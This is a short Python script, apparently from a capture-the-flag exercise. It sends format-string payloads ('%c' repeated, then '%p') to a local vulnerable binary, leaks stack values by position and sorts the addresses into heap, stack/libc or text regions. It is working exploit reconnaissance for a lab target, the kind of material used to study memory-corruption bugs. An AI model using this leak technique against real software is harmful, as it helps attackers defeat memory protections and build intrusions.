import subprocess, re

BIN = "./vuln"
print("rang | valeur imprimee          | interpretation")
for k in range(0, 16):
    payload = "%c" * k + "%p"
    inp = b"1\n" + payload.encode() + b"\n"
    p = subprocess.run([BIN], input=inp, capture_output=True, timeout=60)
    out = p.stdout.decode("latin-1")
    seg = out.split("Buying stonks with token:")[-1]
    m = re.search(r"0x[0-9a-f]+", seg)
    val = m.group(0) if m else ("(rien) rc=%s" % p.returncode)
    note = ""
    try:
        v = int(val, 16)
        if 0x602000 <= v < 0x606000:
            note = "HEAP"
        elif 0x7ff000000000 <= v < 0x800000000000:
            note = "STACK/libc"
        elif 0x400000 <= v < 0x402000:
            note = "TEXTE/.rodata"
    except Exception:
        pass
    print("%4d | %-24s | %s" % (k + 1, val, note))
